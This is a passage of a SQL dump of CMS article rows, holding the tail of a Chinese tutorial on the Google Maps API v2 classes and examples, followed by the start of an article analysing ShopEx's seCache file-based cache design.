开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 17.isHidden() Boolean 假如当前标记不可见，则返回 true。否则，返回 false。（自 2.77 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 示例：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var point = new GLatLng(pointx,pointy);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var icon = new GIcon();&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; icon.image = &quot;http://labs.google.com/ridefinder/images/mm_20_red.png&quot;;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var myMarker = new GMarker(point, icon);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; alert(myMarker.getIcon().image);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var point = new GLatLng(pointx,pointy);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var myMarker = new GMarker(point,{draggable:true});//可拖拽的标记&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; alert(myMarker.getPoint());&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; 4.GPolyline类&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;构造函数&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GPolyline(latlngs, color?, weight?, opacity?, opts?) 根据顶点数组创建折线。color 是一个字符串，包含十六进制数字、HTML 样式的颜色，即 #RRGGBB。weight 是以像素表示的线宽度。 opacity 为 0 到 1 之间的数字。该线条是消除锯齿且半透明的。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;GPolyline包含的方法&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1.getVertexCount() Number 返回折线的顶点数目。（自 2.46 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2.getVertex(index) GLatLng 返回折线中给定索引值对应的顶点。（自 2.46 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 3.getLength() Number 返回沿地球表面的折线长度（以米表示）。（自 2.85 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 4.getBounds() GLatLngBounds 返回此折线的边界。（自 2.85 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5.hide() none 假如当前折线可见并且 GPolyline.supportsHide() 返回 true，则隐藏此线。注：假如当前折线可见，则此函数会触发 GPolyline.visibilitychanged 事件（自 2.87 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6.isHidden() Boolean 假如当前折线不可见，则返回 true。否则，返回 false。（自 2.87 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7.show() none 假如当前折线不可见，则显示该线。注：假如当前折线不可见，则此函数会触发 GPolyline.visibilitychanged 事件。（自 2.87 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;8.supportsHide() Boolean 假如当前环境下支持 GPolyline 对象的 GPolyline.hide()，则返回 true。否则，返回 false。（自 2.87 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注：假如您想在地图里面显示折线，您需要在您的XHTML文档里面包含VML命名空间和一些CSS代码，这样可以令它们在IE下面可以正常工作。XHTM文档的开头看起来就像这&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;样：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xmlns:v=&quot;urn:schemas-microsoft-com:vml&quot;&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;head&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot;/&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;lt;title&amp;gt;My Google Maps Hack&amp;lt;/title&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;style type=&quot;text/css&quot;&amp;gt;v\\:* {behavior:url(#default#VML);}&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/style&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;script src=&quot;http://maps.google.com/maps?file=api&amp;amp;v=2&amp;amp;key=abcdefg&quot; type=&quot;text/javascript&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/head&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; 5.GLatLng类&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;构造函数：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GLatLng(lat, lng, unbounded?) 注重纬度和经度的顺序。假如 unbounded 标记为 true，则表示数字以原始输入状态使用，否则纬度将在 -90 度到 +90 度之间，而经度在 -180 度和 +180 度之间周而复始。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;GlatLng包含的方法：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lat() Number 返回以度数表示的纬度坐标（-90 到 +90 之间的数值）。假如在构造函数中设置了 unbounded 标记，则纬度坐标值可能超出此范围。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; lng() Number 返回以度数表示的经度坐标（-180 到 +180 之间的数值）。假如在构造函数中设置了 unbounded 标记，则经度坐标值可能超出此范围。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; 6. GPoint类&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;GPoint 是以像素坐标表示的地图上的一点。注重：在 v2 中，它不再是以地理坐标表示的地面上的一个点。现在，地理坐标可以用 GLatLng 表示。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 在地图坐标系统中，x 坐标向右增大，y 坐标向下增大。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注重：GPoint 的两个参数同 x 和 y 属性一样可访问，但最好不要修改它们，而是在创建新对象时使用不同的参数。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;7. GEvent命名空间&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 此命名空间包含的函数可用于注册事件处理程序（既处理自定义事件也处理 DOM 事件）和触发自定义事件。此 API 定义的所有事件都是由 GEvent.trigger() 内部触发的自定义事件。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; addListener(source, event, handler) 返回GEventListener 为源对象的自定义事件注册事件处理程序。返回一个可用于最终注销处理程序的句柄。事件触发时，this 将被设置为源对象，同时调用事件处理程序。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; addDomListener(source, event, handler) 返回GEventListener 为源对象的 DOM 事件注册事件处理程序。源对象必须为 DOM 节点。返回一个可用于最终注销处理程序的&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 句柄&amp;nbsp; 。事件触发时，this 被设置为源对象，同时调用事件处理程序。此函数将 DOM 方法用于当前浏览器，来注册事件处理程序。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; removeListener(handle)删除使用 addListener() 或 addDomListener() 安装的处理程序。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; clearListeners(source, event)删除使用 addListener() 或 addDomListener() 为给定事件在给定对象上安装的所有处理程序。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; clearInstanceListeners(source)删除使用 addListener() 或 addDomListener() 为所有事件在给定对象上安装的所有处理程序。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; trigger(source, event, ...)使源对象触发自定义事件。将 event 后所有剩余的可选参数依次输入给事件处理程序作为参数。&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; bind(source, event, object, method)返回GEventListener 将给定对象的方法调用注册为源对象自定义事件的处理程序。返回一个可用于最终注销处理程序的句柄。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; bindDom(source, event, object, method)返回 GEventListener 将给定对象的方法调用注册为源对象自定义事件的处理程序。返回一个可用于最终注销处理程序的句柄。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; callback(object, method) Function 返回在 object 上调用 method 的 closure。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; callbackArgs(object, method, ...) Function 返回在 object 上调用 method 的closure。调用返回的函数时，将 method 后面所有余下的可选参数依次输入 method 作为参数。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;8.GClientGeocoder地址解析类：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 此类用于和 Google 服务器建立直接通讯，以获得用户指定地址的地理位置信息。另外，地理解析器可维护自己的地址缓存，可以无需与服务器通讯而回答反复的查询。注重：目前中国地图地址解析器只支持市/县/区级别的地址。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getLatLng(address, callback) 给 Google 服务器发送请求，对指定的地址进行地址解析。假如地址已成功定位，则用 GLatLng 点调用用户指定的回调函数。否则，向回调函数提供一个 null 点。假如地址不明确，则仅向回调函数传送最匹配的点。（自 2.55 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getLocations(address, callback) 给 Google 服务器发送请求，对指定的地址进行地址解析。包含状态代码的答复，假如答复成功，则向用户指定的回调函数传送一个或多个 Placemark 对象。与 GClientGeocoder.getLatLng 方法不同，回调函数可以通过检查 Status 字段的代码值确定失败原因。（自 2.55 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 示例：&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var map = new GMap2(document.getElementByIdx_x_x(&quot;map&quot;));&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var geocoder = new GClientGeocoder();&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var address=&quot;五道口&quot;;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; geocoder.getLatLng(address,function(point) {&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (!point)&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; alert(address + &quot; not found&quot;);&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; map.setCenter(point, 13);&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var marker = new GMarker(point);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; map.addOverlay(marker);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; marker.openInfoWindowHtml(address);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; alert(point);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; });&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;三：下面是Google API自带控件&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GLargeMapControl：放大缩小调节杆&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GMapTypeControl：地图和卫星图片的切换功能&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GSmallMapControl：GLargeMapControl的精简版 ，去掉了缩放的调节杆保留了缩放按钮&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GSmallZoomControl：只包括缩放按钮，去掉了GLargeMapControl里其他的所有控制&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; GScaleControl：比例尺控件&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;四：减少浏览器内存泄露&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Google Maps API鼓舞使用闭包/Closures，Maps API的第二版引入一个GUnload()函数，用于最大限度地消除可能引发内存泄露的循环引用。您应该在页面的unload事件中调&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;用GUnload()函数来降低您的应用程序内存泄露的风险：&amp;lt;body onunload=&quot;GUnload()&quot;&amp;gt;这个函数确实可以消除Google地图在Internet Explorer下的内存泄露，但是假如您比较关心&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;内存消耗问题，您仍然应该用Drip之类的工具测试您自己网站的内存泄露情况。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;五：浏览器兼容性&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Google Maps API支持的浏览器种类与Google地图网站相同。因为不同的应用程序在碰到不兼容的浏览器的时候需要表现不同的行为，所以Maps API提供了一个全局方法 (GBrowserIsCompatible())来检查兼容性，但是，发现一个不兼容的浏览器时，它不会自动采取任何措施。 http://maps.google.com/maps?file=api&amp;amp;v=2里面的脚本似乎可以在任何浏览器里面解析而不产生错误，所以您可以在检查浏览器兼容性之前就包含脚本文件。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;六：相关资料的网址：&lt;/p&gt;\r\n&lt;p&gt;http://code.google.com/intl/zh-CN/apis/maps/&lt;/p&gt;\r\n&lt;p&gt;http://code.google.com/intl/zh-CN/apis/maps/documentation/javascript/v2/reference.html&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Google地图API的同步中文文档：http://www.codechina.org/doc/google/gmapapi/&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 百度文库：http://wenku.baidu.com/view/a2885c27a5e9856a561260b2.html&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; csdn博客：http://blog.csdn.net/jiali765/archive/2010/03/03/5338265.aspx&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;http://www.jbedu.com/study/jishuwenzhang/196.html&lt;/p&gt;\r\n            			&lt;/div&gt;\r\n', 1, 1, 0, 0, 1301640633, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(12, 1, 'ShopEx缓存系统seCache分析', '', '', '&lt;div class=&quot;entery-content&quot;&gt;				&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;seCache是ShopEx设计的用于虚机等无法使用memCached等缓存机制情况下的由php编写的key-value单文件缓存系统,缓存数据文件是一个独立的二进制文件，事实上是一个key-value型数据库。&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;seCache机制的设计目标是在固定存储空间下实现对shopex缓存文件的快速查找、调度删除、更新机制。其目的是解决文件分散存储情况下小文件过多、空间无限膨胀、管理不方便的弊端。&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;seCache&lt;span style=&quot;font-family:宋体;&quot;&gt;存储系统仅由一个文件组成，其中存储了缓存文件索引&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(seCache&amp;nbsp;key&amp;nbsp;)&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;与缓存文件数据&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(seCache&amp;nbsp;data)&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;。这样我们可以方便地控制总缓存空间的大小&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;h4 style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-weight:bold;font-size:14pt;font-family:''宋体'';&quot;&gt;seCache&lt;span style=&quot;font-family:宋体;&quot;&gt;存储结构&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-weight:bold;font-size:14pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/h4&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;对于每一个缓存文件，都会有一个根据链接、运行环境得出的唯一的&lt;span style=&quot;font-family:times new roman;&quot;&gt;md5&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;值作为标识。我们使用&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;hash&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;索引方式快速查找定位到相应的文件在数据文件中的位置。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;hash&lt;span style=&quot;font-family:宋体;&quot;&gt;索引算法采用取余法，值域为&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;0-64K&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，即取值&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;md5&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;值的最后四位。同义词冲突算法采用基于单向&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;hash&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;链表的拉链法解决。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;存储分配算法采用固定空间分配算法，把存储数据文件的空间划分为多个存储区，每一存储区只能存储小于指定块大小的文件，各存储区指定的块大小各不相同，一般各指定块大小按序排列时，会形成一个菲波那契数列，也可按实际情况调整。&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;当&lt;span style=&quot;font-family:times new roman;&quot;&gt;seCache&amp;nbsp;data&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;中的某一存储区中数据超过限制时&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;,&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;我们会根据&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;LRU&lt;/span&gt;&lt;span 